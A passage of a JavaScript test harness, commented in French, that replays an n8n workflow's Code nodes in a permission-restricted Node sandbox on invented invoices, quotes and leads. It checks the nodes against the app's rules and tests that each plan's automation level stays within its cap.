    // Réseau : `process.permission.has('net')` n'est pas une preuve (Node 24 rend `false` et laisse pourtant partir la connexion).
    // On essaie pour de vrai, vers la boucle locale seulement (port 9, « discard »), et on referme aussitôt : Node 25 et suivants
    // refusent dès l'appel (ERR_ACCESS_DENIED, sans `--allow-net`) ; Node 24 n'a pas ce barrage.
    try { const s = reseau.connect({ port: 9, host: '127.0.0.1' }); s.on('error', () => {}); s.destroy(); r.reseau = 'PERMIS' } catch (e) { r.reseau = (e && e.code) || texte(e) }
    r.node = process.version
    return r
  }
  process.on('message', (m) => {
    let rep
    try {
      const valeur = m.type === 'passer' ? passer(m) : m.type === 'executer' ? executer(m.jsCode, '{}', [{}], m.jour) : m.type === 'sonde' ? sonder(m) : null
      rep = { id: m.id, ok: true, valeur }
    } catch (e) { rep = { id: m.id, ok: false, erreur: texte(e) } }
    process.send(rep)
  })
}
const CODE_ENFANT = '(' + enfant.toString() + ')()'

class BacASable {
  constructor() {
    // `--permission` (stable depuis Node 23.5 et 22.13) ; `--experimental-permission` avant.
    const permission = process.allowedNodeEnvironmentFlags.has('--permission') ? '--permission' : '--experimental-permission'
    this.drapeaux = [permission, '--disallow-code-generation-from-strings']
    const env = {}
    if (process.env.SystemRoot) env.SystemRoot = process.env.SystemRoot // Windows : sans lui, Node ne démarre pas toujours
    this.p = spawn(process.execPath, [...this.drapeaux, '-e', CODE_ENFANT], { stdio: ['ignore', 'ignore', 'pipe', 'ipc'], env, serialization: 'json', windowsHide: true })
    this.attente = new Map()
    this.n = 0
    this.erreurs = ''
    this.p.stderr.on('data', (d) => { this.erreurs = (this.erreurs + d).slice(-2000) })
    this.p.on('message', (m) => { const a = this.attente.get(m.id); if (!a) return; this.attente.delete(m.id); if (m.ok) a.ok(m.valeur); else a.ko(new Error(m.erreur)) })
    this.p.on('exit', (code) => {
      this.arrete = true
      for (const a of this.attente.values()) a.ko(new Error(`bac à sable arrêté (code ${code}) ${this.erreurs.slice(0, 300)}`))
      this.attente.clear()
    })
  }
  demander(m) {
    if (this.arrete) return Promise.reject(new Error(`bac à sable arrêté ${this.erreurs.slice(0, 300)}`))
    return new Promise((ok, ko) => { const id = ++this.n; this.attente.set(id, { ok, ko }); this.p.send({ ...m, id }) })
  }
  fermer() { this.p.kill() }
}
const BAC = new BacASable()

// ─── 2. Copies figées comparées au code ────────────────────────────────────────────────────────────────────────────────────────
const executer = async (wf, nom, jour) => {
  const r = await BAC.demander({ type: 'executer', jsCode: codeDe(wf, nom), jour })
  if (r.violations.length) throw new Error(`accès refusé par le bac à sable (${[...new Set(r.violations)].join(', ')})`)
  if (r.erreur) throw new Error(r.erreur)
  return r.items
}
async function copies(wf) {
  const e = []
  let cap, ctx
  try { cap = (await executer(wf, 'Capacités des offres', '2026-11-10'))[0] } catch (err) { return [`Capacités des offres : ${err.message}`] }
  try { ctx = (await executer(wf, 'Contexte du passage', '2026-11-10'))[0] } catch (err) { return [`Contexte du passage : ${err.message}`] }
  for (const offre of ['studio', 'signature', 'entreprise']) {
    if (!memes(cap.capacites?.[offre] ?? [], PLANS[offre].capacites)) e.push(`copie des capacités « ${offre} » différente de lib/plans.ts`)
  }
  if (Object.keys(cap.capacites ?? {}).some((k) => !['studio', 'signature', 'entreprise'].includes(k))) e.push('la copie ne doit porter que Studio, Signature et Entreprise')
  if (!memes(cap.outils_jamais_auto ?? [], OUTILS_JAMAIS_AUTO)) e.push('copie de OUTILS_JAMAIS_AUTO différente de lib/pilote/regles.ts')
  if (!memes(cap.outils_executables_pilote ?? [], OUTILS_EXECUTABLES_PILOTE)) e.push('copie de OUTILS_EXECUTABLES_PILOTE différente de lib/pilote/regles.ts')
  const s = ctx.seuils ?? {}
  if (ctx.mode !== 'simulation') e.push('mode simulation attendu')
  if ((s.impayes_jours ?? []).join(',') !== JOURS_PAR_DEFAUT.join(',')) e.push('étapes des impayés différentes de lib/relancesImpayes.ts')
  if (s.impayes_rattrapage !== RATTRAPAGE_IMPAYES) e.push('rattrapage des impayés différent de lib/relancesImpayes.ts')
  if (s.avis_delai !== DELAI_AVIS_JOURS || s.avis_rattrapage !== RATTRAPAGE_AVIS) e.push('délai de la demande d\'avis différent de lib/apresChantier.ts')
  if (s.devis_validite_defaut !== VALIDITE_PAR_DEFAUT_JOURS) e.push('validité par défaut d\'un devis différente du code')
  if ((s.devis_jours ?? []).join(',') !== '3,7,14') e.push('étapes du devis sans réponse : 3, 7, 14 attendues (plan §9, n° 4)')
  // Aucune décision par le nom de l'offre dans la logique : le niveau se lit dans la copie.
  for (const nom of [...DETECTEURS, 'Niveau proposé selon l offre']) {
    if (/plan\s*[!=]==?\s*['"]|['"](studio|signature|entreprise)['"]\s*[!=]==?/.test(codeDe(wf, nom))) e.push(`${nom} : décision par le nom de l'offre (plan === …) interdite`)
  }
  return e
}

// ─── 3. Rejeu des nœuds Code sur des données fictives, dans le bac à sable ────────────────────────────────────────────────────
const LECTURES = (wf) => wf.nodes.filter((n) => n.type === 'n8n-nodes-base.httpRequest').map((n) => n.name)

/** Un passage complet, de « Départ des constats » au bilan, sur des lectures fictives, rejoué dans le processus enfant. */
async function passer(wf, donnees, jour) {
  const lectures = LECTURES(wf)
  for (const k of Object.keys(donnees)) if (!lectures.includes(k)) throw new Error(`donnée fictive pour un nœud absent : ${k}`)
  // Une table vide rend un élément vide, comme alwaysOutputData dans n8n.
  const sorties = {}
  for (const l of lectures) sorties[l] = donnees[l]?.length ? donnees[l] : [{}]
  const parNoeud = await BAC.demander({
    type: 'passer', jour, lectures: sorties,
    prealables: ['Contexte du passage', 'Capacités des offres'].map((nom) => [nom, codeDe(wf, nom)]),
    etapes: chaineDepuis(wf, 'Départ des constats').map((nom) => [nom, codeDe(wf, nom)]),
  })
  return { constats: parNoeud['Niveau proposé selon l offre']?.[0]?.constats ?? [], bilan: parNoeud['Bilan par détecteur'] ?? [], parNoeud }
}

// Données fictives : identifiants inventés, aucun nom, aucune adresse.
const u = (n) => '00000000-0000-4000-8000-' + String(n).padStart(12, '0')
const STUDIO = u(1), SIGNATURE = u(2), ENTREPRISE = u(3), HORS = u(9)
const JOUR = '2026-11-10'
const jourMoins = (n, depuis = JOUR) => { const d = new Date(depuis + 'T12:00:00Z'); d.setUTCDate(d.getUTCDate() - n); return d.toISOString().slice(0, 10) }
const horodate = (n, depuis = JOUR) => jourMoins(n, depuis) + 'T10:00:00+00:00'
const COMPTES = [{ id: STUDIO, plan: 'studio' }, { id: SIGNATURE, plan: 'signature' }, { id: ENTREPRISE, plan: 'entreprise' }]
const avec = (lignes) => ({ 'Lire comptes': COMPTES, ...lignes })
const facture = (o) => ({ id: u(100), artisan_id: STUDIO, devis_id: null, statut: 'emise', date_echeance: jourMoins(3), total_ttc: 1000, avoir_de: null, payee_le: null, type_facture: 'standard', ...o })
const devis = (o) => ({ id: u(200), artisan_id: STUDIO, statut: 'envoye', date_emission: jourMoins(3), validite_jours: 90, acompte_pct: 0, total_ttc: 800, lead_id: null, accepte_le: null, envoye_le: horodate(3), created_at: horodate(3), ...o })
const demande = (o) => ({ id: u(300), artisan_id: STUDIO, statut: 'nouveau', urgence: null, type_chantier: null, created_at: horodate(1), ...o })
const chantier = (o) => ({ id: u(400), artisan_id: SIGNATURE, devis_id: null, statut: 'termine', date_fin_reelle: jourMoins(2), maj_le: horodate(2), ...o })

async function cas(wf) {
  const e = []
  const ko = (m) => e.push(m)
  let rang = 0
  // Chaque cas passe aussi par `controler` : les plafonds tiennent sur chaque constat de chaque cas.
  const run = async (donnees, jour = JOUR) => { const d = avec(donnees); const r = await passer(wf, d, jour); controler(`cas ${++rang}`, d, r.constats, ko); return r }
  const de = (r, n) => r.constats.filter((c) => c.numero === n)
  const cles = (r, n) => de(r, n).map((c) => c.cle).sort().join(' ')
  const seul = (titre, r, n, cle, extra = {}) => {
    const l = de(r, n)
    if (l.length !== 1 || l[0].cle !== cle) { ko(`${titre} : attendu ${cle}, obtenu [${cles(r, n)}]`); return null }
    for (const [k, v] of Object.entries(extra)) if (l[0][k] !== v) ko(`${titre} : ${k} attendu ${v}, obtenu ${l[0][k]}`)
    return l[0]
  }
  const rien = (titre, r, n) => { if (de(r, n).length) ko(`${titre} : rien attendu, obtenu [${cles(r, n)}]`) }
  let r
  try {
    // n° 1 — facture échue
    r = await run({ 'Lire factures': [facture()] }); seul('1 J+3 pile', r, 1, `facture_echue:${u(100)}:j3`, { montant_centimes: 100000, jours: 3, niveau: 2 })
    r = await run({ 'Lire factures': [facture({ date_echeance: jourMoins(2) })] }); rien('1 J+2', r, 1)
    r = await run({ 'Lire factures': [facture({ date_echeance: jourMoins(10) })], 'Lire relances impayes': [{ id: u(801), artisan_id: STUDIO, facture_id: u(100), rang: 1, statut: 'envoyee' }] })
    seul('1 étape suivante', r, 1, `facture_echue:${u(100)}:j10`)
    r = await run({ 'Lire factures': [facture({ payee_le: JOUR })] }); rien('1 payée', r, 1)
    r = await run({ 'Lire factures': [facture({ statut: 'payee' })] }); rien('1 statut payée', r, 1)
    r = await run({ 'Lire factures': [facture({ avoir_de: u(150) })] }); rien('1 avoir', r, 1)
    r = await run({ 'Lire factures': [facture()], 'Lire arrets de relance': [{ facture_id: u(100), artisan_id: STUDIO, raison: 'reponse_client', reprise_le: null }] }); rien('1 arrêtée', r, 1)
    r = await run({ 'Lire factures': [facture()], 'Lire arrets de relance': [{ facture_id: u(100), artisan_id: STUDIO, raison: 'artisan', reprise_le: horodate(1) }] }); seul('1 reprise', r, 1, `facture_echue:${u(100)}:j3`)
    r = await run({ 'Lire factures': [facture()], 'Lire relances impayes': [{ id: u(802), artisan_id: STUDIO, facture_id: u(100), rang: 1, statut: 'a_valider' }] }); rien('1 à valider en attente', r, 1)
    r = await run({ 'Lire factures': [facture({ date_echeance: jourMoins(40) })] }); rien('1 trop ancienne', r, 1)
    r = await run({ 'Lire factures': [facture({ artisan_id: HORS })] }); rien('1 compte hors offre', r, 1)
    r = await run({ 'Lire factures': [facture({ artisan_id: SIGNATURE })], 'Lire reglages des relances': [{ artisan_id: SIGNATURE, actif: true, jours: [3, 10, 21] }] }); seul('1 Signature cochée', r, 1, `facture_echue:${u(100)}:j3`, { niveau: 3 })
    r = await run({ 'Lire factures': [facture({ artisan_id: SIGNATURE })] }); seul('1 Signature non cochée', r, 1, `facture_echue:${u(100)}:j3`, { niveau: 2 })
    r = await run({ 'Lire factures': [facture()], 'Lire reglages des relances': [{ artisan_id: STUDIO, actif: true, jours: [3, 10, 21] }] }); seul('1 Studio cochée', r, 1, `facture_echue:${u(100)}:j3`, { niveau: 2 })

    // n° 2 — chantier à facturer
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000, accepte_le: horodate(5) })] }); seul('2 Studio devis accepté', r, 2, `chantier_a_facturer:${u(200)}:accepte`, { montant_centimes: 200000, niveau: 2 })
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'standard', statut: 'emise' })] }); rien('2 Studio facturé', r, 2)
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'acompte', total_ttc: 600 })] }); seul('2 reste après acompte', r, 2, `chantier_a_facturer:${u(200)}:accepte`, { montant_centimes: 140000 })
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'solde', statut: 'annulee' })] }); seul('2 solde annulé', r, 2, `chantier_a_facturer:${u(200)}:accepte`)
    r = await run({ 'Lire devis': [devis({ artisan_id: SIGNATURE, statut: 'accepte', total_ttc: 3000 })], 'Lire chantiers': [chantier({ devis_id: u(200) })] }); seul('2 Signature chantier terminé', r, 2, `chantier_a_facturer:${u(400)}:termine`, { montant_centimes: 300000, niveau: 2 })
    r = await run({ 'Lire devis': [devis({ artisan_id: SIGNATURE, statut: 'accepte', total_ttc: 3000 })], 'Lire chantiers': [chantier({ devis_id: u(200), statut: 'en_cours' })] }); rien('2 Signature chantier en cours', r, 2)

    // n° 3 — devis signé sans acompte
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', acompte_pct: 30, total_ttc: 2000, accepte_le: horodate(1) })] }); seul('3 acompte manquant', r, 3, `devis_signe_sans_acompte:${u(200)}:signe`, { montant_centimes: 60000, niveau: 2 })
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', acompte_pct: 30 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'acompte' })] }); rien('3 acompte facturé', r, 3)
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', acompte_pct: 30 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'acompte', statut: 'annulee' })] }); seul('3 acompte annulé', r, 3, `devis_signe_sans_acompte:${u(200)}:signe`)
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', acompte_pct: 0 })] }); rien('3 sans acompte prévu', r, 3)
    r = await run({ 'Lire devis': [devis({ artisan_id: SIGNATURE, statut: 'accepte', acompte_pct: 30 })], 'Lire reglages des relances': [{ artisan_id: SIGNATURE, actif: true }] }); seul('3 Signature : une facture ne s’émet jamais seule', r, 3, `devis_signe_sans_acompte:${u(200)}:signe`, { niveau: 2 })

    // n° 4 — devis sans réponse
    r = await run({ 'Lire devis': [devis()] }); seul('4 J+3 pile', r, 4, `devis_sans_reponse:${u(200)}:j3`, { montant_centimes: 80000, jours: 3, niveau: 2 })
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(2) })] }); rien('4 J+2', r, 4)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(7) })] }); seul('4 étape J+7', r, 4, `devis_sans_reponse:${u(200)}:j7`)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(20) })] }); seul('4 étape J+14', r, 4, `devis_sans_reponse:${u(200)}:j14`)
    r = await run({ 'Lire devis': [devis({ statut: 'accepte' })] }); rien('4 accepté', r, 4)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(31), validite_jours: 30 })] }); rien('4 validité dépassée', r, 4)
    r = await run({ 'Lire devis': [devis({ artisan_id: SIGNATURE })] }); seul('4 Signature', r, 4, `devis_sans_reponse:${u(200)}:j3`, { niveau: 3 })

    // n° 5 — coupé
    r = await run({ 'Lire factures': [facture(), facture({ id: u(101), date_echeance: jourMoins(60) })], 'Lire devis': [devis()] })
    rien('5 coupé', r, 5)
    const d5 = r.parNoeud['Détecteur 05 facture jamais envoyée (coupé)']?.[0]?.constats ?? []
    const d4 = r.parNoeud['Détecteur 04 devis sans réponse']?.[0]?.constats ?? []
    if (JSON.stringify(d5) !== JSON.stringify(d4)) ko('5 coupé : le nœud doit rendre ses entrées telles quelles')

    // n° 6 — demande sans réponse
    r = await run({ 'Lire demandes': [demande()] }); seul('6 J+1 pile', r, 6, `demande_sans_reponse:${u(300)}:j1`, { niveau: 2 })
    r = await run({ 'Lire demandes': [demande({ created_at: horodate(0) })] }); rien('6 le jour même', r, 6)
    r = await run({ 'Lire demandes': [demande({ created_at: horodate(3) })] }); seul('6 étape J+3', r, 6, `demande_sans_reponse:${u(300)}:j3`)
    r = await run({ 'Lire demandes': [demande({ statut: 'repondu' })] }); rien('6 répondue', r, 6)
    r = await run({ 'Lire demandes': [demande({ artisan_id: SIGNATURE })], 'Lire reglages de la plateforme': [{ artisan_id: SIGNATURE, mode_reponse: 'auto' }] }); seul('6 Signature auto', r, 6, `demande_sans_reponse:${u(300)}:j1`, { niveau: 3 })
    r = await run({ 'Lire demandes': [demande({ artisan_id: SIGNATURE })], 'Lire reglages de la plateforme': [{ artisan_id: SIGNATURE, mode_reponse: 'assistee' }] }); seul('6 Signature assistée', r, 6, `demande_sans_reponse:${u(300)}:j1`, { niveau: 2 })
    r = await run({ 'Lire demandes': [demande()], 'Lire reglages de la plateforme': [{ artisan_id: STUDIO, mode_reponse: 'auto' }] }); seul('6 Studio en « auto » reste à 2', r, 6, `demande_sans_reponse:${u(300)}:j1`, { niveau: 2 })

    // n° 7 — demande sans devis (jamais niveau 3)
    const tarif = { 'Lire tarifs': [{ id: u(901), artisan_id: STUDIO, actif: true }, { id: u(902), artisan_id: SIGNATURE, actif: true }] }
    r = await run({ ...tarif, 'Lire demandes': [demande({ urgence: 'urgent' })] }); seul('7 qualifiée', r, 7, `demande_sans_devis:${u(300)}:brouillon`, { niveau: 2 })
    r = await run({ 'Lire demandes': [demande({ urgence: 'urgent' })] }); rien('7 sans tarifs', r, 7)
    r = await run({ ...tarif, 'Lire demandes': [demande()] }); rien('7 non qualifiée', r, 7)
    r = await run({ ...tarif, 'Lire demandes': [demande({ type_chantier: 'Plomberie' })], 'Lire devis': [devis({ lead_id: u(300), statut: 'brouillon' })] }); rien('7 devis lié', r, 7)
    r = await run({ ...tarif, 'Lire demandes': [demande({ urgence: 'urgent', statut: 'perdu' })] }); rien('7 perdue', r, 7)
    r = await run({ ...tarif, 'Lire demandes': [demande({ artisan_id: SIGNATURE, urgence: 'urgent' })], 'Lire reglages de la plateforme': [{ artisan_id: SIGNATURE, mode_reponse: 'auto' }], 'Lire reglages des relances': [{ artisan_id: SIGNATURE, actif: true }] })
    seul('7 Signature tout coché : jamais 3', r, 7, `demande_sans_devis:${u(300)}:brouillon`, { niveau: 2 })

    // n° 8 — devis bientôt expiré
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(23), validite_jours: 30 })] }); seul('8 J-7 pile', r, 8, `devis_bientot_expire:${u(200)}:expire`, { jours: 7, montant_centimes: 80000 })
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(22), validite_jours: 30 })] }); rien('8 J-8', r, 8)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(30), validite_jours: 30 })] }); rien('8 dernier jour passé', r, 8)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(23), validite_jours: 30, statut: 'refuse' })] }); rien('8 refusé', r, 8)

    // n° 9 — stock sous le seuil
    const resa = { 'Lire chantiers': [chantier({ id: u(402), statut: 'en_cours', date_fin_reelle: null })], 'Lire reservations': [{ id: u(501), artisan_id: SIGNATURE, chantier_id: u(402), materiau_id: u(601), quantite: 5, statut: 'reserve' }], 'Lire materiaux': [{ id: u(601), artisan_id: SIGNATURE, seuil_alerte: 0 }] }
    r = await run({ ...resa, 'Lire stock': [{ id: u(701), materiau_id: u(601), quantite: 2 }] }); seul('9 réservation qui manque', r, 9, `stock_sous_seuil:${u(402)}:chantier`, { niveau: 2 })
    r = await run({ ...resa, 'Lire stock': [{ id: u(701), materiau_id: u(601), quantite: 6 }] }); rien('9 stock suffisant', r, 9)
    r = await run({ ...resa, 'Lire stock': [{ id: u(701), materiau_id: u(601), quantite: 2 }], 'Lire commandes': [{ id: u(61), artisan_id: SIGNATURE, statut: 'commandee', chantier_id: u(402) }] }); rien('9 commande passée', r, 9)
    r = await run({ 'Lire materiaux': [{ id: u(602), artisan_id: STUDIO, seuil_alerte: 3 }], 'Lire stock': [{ id: u(702), materiau_id: u(602), quantite: 3 }] }); seul('9 Studio au seuil pile', r, 9, `stock_sous_seuil:${u(602)}:seuil`, { niveau: 2 })
    r = await run({ 'Lire materiaux': [{ id: u(602), artisan_id: STUDIO, seuil_alerte: 3 }], 'Lire stock': [{ id: u(702), materiau_id: u(602), quantite: 4 }] }); rien('9 Studio au-dessus du seuil', r, 9)

    // n° 10 — demande d'avis
    const avis = { 'Lire apres chantier': [{ artisan_id: SIGNATURE, avis: true }] }
    r = await run({ ...avis, 'Lire chantiers': [chantier()] }); seul('10 J+2 pile', r, 10, `demande_avis:${u(400)}:avis`, { jours: 2, niveau: 2 })
    r = await run({ ...avis, 'Lire chantiers': [chantier({ date_fin_reelle: jourMoins(1) })] }); rien('10 J+1', r, 10)
    r = await run({ ...avis, 'Lire chantiers': [chantier({ date_fin_reelle: jourMoins(16) })] }); seul('10 dernier jour de rattrapage', r, 10, `demande_avis:${u(400)}:avis`)
    r = await run({ ...avis, 'Lire chantiers': [chantier({ date_fin_reelle: jourMoins(17) })] }); rien('10 fenêtre close', r, 10)
    r = await run({ 'Lire chantiers': [chantier()] }); rien('10 avis non coché', r, 10)
    r = await run({ 'Lire apres chantier': [{ artisan_id: STUDIO, avis: true }], 'Lire chantiers': [chantier({ artisan_id: STUDIO })] }); rien('10 Studio sans CRM', r, 10)

    // Règles transverses, sur un jeu riche : Studio ≤ 2 ; n° 7 jamais 3 ; aucun champ personnel ; clé bien formée ; bilan cohérent.
    const riche = {
      ...tarif, ...avis,
      'Lire factures': [facture(), facture({ id: u(102), artisan_id: SIGNATURE }), facture({ id: u(103), artisan_id: ENTREPRISE })],
      'Lire devis': [devis(), devis({ id: u(202), artisan_id: SIGNATURE }), devis({ id: u(203), artisan_id: ENTREPRISE, statut: 'accepte', acompte_pct: 20 })],
      'Lire demandes': [demande({ urgence: 'urgent' }), demande({ id: u(302), artisan_id: SIGNATURE, urgence: 'urgent' })],
      'Lire chantiers': [chantier()],
      'Lire reglages des relances': [{ artisan_id: STUDIO, actif: true }, { artisan_id: SIGNATURE, actif: true }, { artisan_id: ENTREPRISE, actif: true }],
      'Lire reglages de la plateforme': [{ artisan_id: STUDIO, mode_reponse: 'auto' }, { artisan_id: SIGNATURE, mode_reponse: 'auto' }, { artisan_id: ENTREPRISE, mode_reponse: 'auto' }],
    }
    r = await run(riche)
    if (!r.constats.length) ko('jeu riche : aucun constat')
    for (const c of r.constats) {
      if (c.offre === 'studio' && c.niveau > 2) ko(`Studio au niveau ${c.niveau} : ${c.cle}`)
      if (c.numero === 7 && c.niveau >= 3) ko(`n° 7 au niveau 3 : ${c.cle}`)
      if (c.numero === 5) ko(`n° 5 a sorti un constat : ${c.cle}`)
      if (![1, 2, 3].includes(c.niveau)) ko(`niveau hors de 1-3 : ${c.cle}`)
      if (!/^[a-z_]+:[0-9a-f-]{36}:[a-z0-9_]+$/.test(c.cle)) ko(`clé mal formée : ${c.cle}`)
      const champs = []
      const parcourir = (o, p = '') => { for (const [k, v] of Object.entries(o)) { champs.push(p + k); if (v && typeof v === 'object' && !Array.isArray(v)) parcourir(v, p + k + '.') } }
      parcourir(c)
      for (const k of champs) if (INTERDIT.test(k)) ko(`constat porteur d'un champ interdit (${k}) : ${c.cle}`)
      if (['creer_facture', 'creer_facture_libre'].includes(c.outil) && c.niveau > 2) ko(`une facture partirait seule : ${c.cle}`)
      if (OUTILS_JAMAIS_AUTO.includes(c.outil) && c.niveau > 2) ko(`geste §3.2 au niveau 3 : ${c.cle}`)
    }
    if (!r.constats.some((c) => c.offre === 'signature' && c.niveau === 3)) ko('jeu riche : aucun niveau 3 en Signature (le juge ne verrait plus rien)')
    if (r.bilan.length !== 10) ko(`bilan : 10 lignes attendues (${r.bilan.length})`)
    for (const b of r.bilan) {
      const l = r.constats.filter((c) => c.numero === b.numero)
      const somme = l.reduce((s, c) => s + (c.montant_centimes || 0), 0)
      if (b.nombre !== l.length || b.montant_total_centimes !== somme) ko(`bilan n° ${b.numero} incohérent`)
      const cles = Object.keys(b).sort().join(',')
      if (cles !== 'detecteur,mode,montant_total_centimes,nombre,numero,par_niveau') ko(`bilan n° ${b.numero} : champs inattendus (${cles})`)
      if (b.mode !== 'simulation') ko('bilan hors simulation')
    }
    // Idempotence : deux passages sur les mêmes données donnent les mêmes clés.
    const r2 = await run(riche)
    if (r2.constats.map((c) => c.cle).join() !== r.constats.map((c) => c.cle).join()) ko('deux passages identiques ne donnent pas les mêmes clés')
  } catch (err) {
    ko(`exception pendant le rejeu : ${err.message}`)
  }
  return e
}

// ─── 4. É2 : le test par propriété des plafonds ───────────────────────────────────────────────────────────────────────────────
// Pour chaque offre (Studio, Signature, Entreprise) × impayés cochés ou non × réponse `auto` ou `assistee`, un compte fictif ; pour
// chaque compte, de quoi déclencher chaque détecteur à plusieurs étapes et pour des montants de 1 € à 100 000 €. Le cas doit
// déclencher (sinon la propriété ne prouverait rien), et chaque constat passe par `controler` : niveau ≤ plafond(offre, détecteur).
const OFFRES = ['studio', 'signature', 'entreprise']
const MONTANTS = [1, 999.99, 1000, 12345.67, 100000]
const JOURS_PROPRIETE = ['2026-11-10', '2026-03-30'] // un jour ordinaire, et le lendemain du passage à l'heure d'été
function jeuPropriete(jour) {
  const jm = (n) => jourMoins(n, jour)
  const hd = (n) => horodate(n, jour)
  const d = { 'Lire comptes': [], 'Lire factures': [], 'Lire devis': [], 'Lire demandes': [], 'Lire chantiers': [], 'Lire reservations': [], 'Lire materiaux': [],
    'Lire stock': [], 'Lire relances impayes': [], 'Lire reglages des relances': [], 'Lire reglages de la plateforme': [], 'Lire tarifs': [], 'Lire apres chantier': [] }
  const attendus = [] // { numero, id, compte, declenche }
  let n = 10000
  const id = () => u(++n)
  for (const offre of OFFRES) for (const impayes of [true, false]) for (const reponse of ['auto', 'assistee']) {
    const a = id()
    const titre = `${offre}, impayés ${impayes ? 'cochés' : 'non cochés'}, réponse ${reponse}`
    const crm = peut(offre, 'crm')
    d['Lire comptes'].push({ id: a, plan: offre })
    if (impayes) d['Lire reglages des relances'].push({ artisan_id: a, actif: true, jours: [3, 10, 21] })
    d['Lire reglages de la plateforme'].push({ artisan_id: a, mode_reponse: reponse })
    d['Lire tarifs'].push({ id: id(), artisan_id: a, actif: true })
    d['Lire apres chantier'].push({ artisan_id: a, avis: true })
    const attendre = (numero, objet, etape, declenche = true) => attendus.push({ numero, id: objet, compte: titre, etape, declenche })
    for (const montant of MONTANTS) {
      // n° 1 : J+3 ; J+10 après la relance de rang 1 ; J+21 après les rangs 1 et 2.
      for (const [retard, rangs] of [[3, []], [10, [1]], [21, [1, 2]]]) {
        const f = id()
        d['Lire factures'].push(facture({ id: f, artisan_id: a, date_echeance: jm(retard), total_ttc: montant }))
        for (const r of rangs) d['Lire relances impayes'].push({ id: id(), artisan_id: a, facture_id: f, rang: r, statut: 'envoyee' })
        attendre(1, f, `J+${retard}, ${montant} €`)
      }
      // n° 2 : devis accepté sans facture de solde ; avec le CRM, il faut le chantier terminé (le constat porte le chantier).
      const d2 = id()
      d['Lire devis'].push(devis({ id: d2, artisan_id: a, statut: 'accepte', total_ttc: montant, accepte_le: hd(5) }))
      if (crm) { const c = id(); d['Lire chantiers'].push(chantier({ id: c, artisan_id: a, devis_id: d2, date_fin_reelle: jm(3), maj_le: hd(3) })); attendre(2, c, `${montant} €`) } else attendre(2, d2, `${montant} €`)
      // n° 3 : acompte de 10, 30 et 100 %.
      for (const pct of [10, 30, 100]) { const d3 = id(); d['Lire devis'].push(devis({ id: d3, artisan_id: a, statut: 'accepte', acompte_pct: pct, total_ttc: montant, accepte_le: hd(1) })); attendre(3, d3, `${pct} % de ${montant} €`) }
      // n° 4 : J+3, J+7, J+14 ; n° 8 : il reste 7 jours, puis 1 jour.
      for (const age of [3, 7, 14]) { const d4 = id(); d['Lire devis'].push(devis({ id: d4, artisan_id: a, total_ttc: montant, envoye_le: hd(age), date_emission: jm(age), created_at: hd(age) })); attendre(4, d4, `J+${age}, ${montant} €`) }
      for (const age of [23, 29]) { const d8 = id(); d['Lire devis'].push(devis({ id: d8, artisan_id: a, total_ttc: montant, validite_jours: 30, envoye_le: hd(age), date_emission: jm(age), created_at: hd(age) })); attendre(8, d8, `reste ${30 - age} j, ${montant} €`) }
    }
    // n° 6 : J+1, J+3, J+10 ; n° 7 : demande qualifiée (urgence, puis type de chantier), compte avec un tarif actif.
    for (const age of [1, 3, 10]) { const l = id(); d['Lire demandes'].push(demande({ id: l, artisan_id: a, created_at: hd(age) })); attendre(6, l, `J+${age}`) }
    for (const q of [{ urgence: 'urgent' }, { type_chantier: 'Plomberie' }]) { const l = id(); d['Lire demandes'].push(demande({ id: l, artisan_id: a, created_at: hd(2), ...q })); attendre(7, l, Object.keys(q)[0]) }
    // n° 9 : avec le CRM, réservation d'un chantier ouvert qui manque ; sans lui, matériau au seuil.
    if (crm) {
      const c = id(), m = id()
      d['Lire chantiers'].push(chantier({ id: c, artisan_id: a, statut: 'en_cours', date_fin_reelle: null }))
      d['Lire materiaux'].push({ id: m, artisan_id: a, seuil_alerte: 0 })
      d['Lire reservations'].push({ id: id(), artisan_id: a, chantier_id: c, materiau_id: m, quantite: 5, statut: 'reserve' })
      d['Lire stock'].push({ id: id(), materiau_id: m, quantite: 2 })
      attendre(9, c, 'réservation')
    } else {
      const m = id()
      d['Lire materiaux'].push({ id: m, artisan_id: a, seuil_alerte: 3 })
      d['Lire stock'].push({ id: id(), materiau_id: m, quantite: 3 })
      attendre(9, m, 'seuil')
    }
    // n° 10 : chantier terminé à J+2 et J+10 ; sans le CRM, il doit se taire.
    for (const age of [2, 10]) { const c = id(); d['Lire chantiers'].push(chantier({ id: c, artisan_id: a, date_fin_reelle: jm(age), maj_le: hd(age) })); attendre(10, c, `J+${age}`, crm) }
  }
  return { donnees: d, attendus }
}
async function proprietes(wf) {
  const e = []
  const ko = (m) => e.push(m)
  let constats = 0, cases = 0
  const parNiveau = { 1: 0, 2: 0, 3: 0 }
  try {
    for (const jour of JOURS_PROPRIETE) {
      const { donnees, attendus } = jeuPropriete(jour)
      const r = await passer(wf, donnees, jour)
      controler(`propriété du ${jour}`, donnees, r.constats, ko)
      constats += r.constats.length
      for (const c of r.constats) parNiveau[c.niveau] = (parNiveau[c.niveau] ?? 0) + 1
      if (r.constats.some((c) => c.numero === 5)) ko(`propriété du ${jour} : le n° 5 a sorti un constat`)
      for (const x of attendus) {
        cases++
        const l = r.constats.filter((c) => c.numero === x.numero && c.objet?.id === x.id)
        if (x.declenche && l.length !== 1) ko(`propriété du ${jour} : n° ${x.numero} (${x.compte}, ${x.etape}) : un constat attendu, ${l.length} obtenu(s)`)
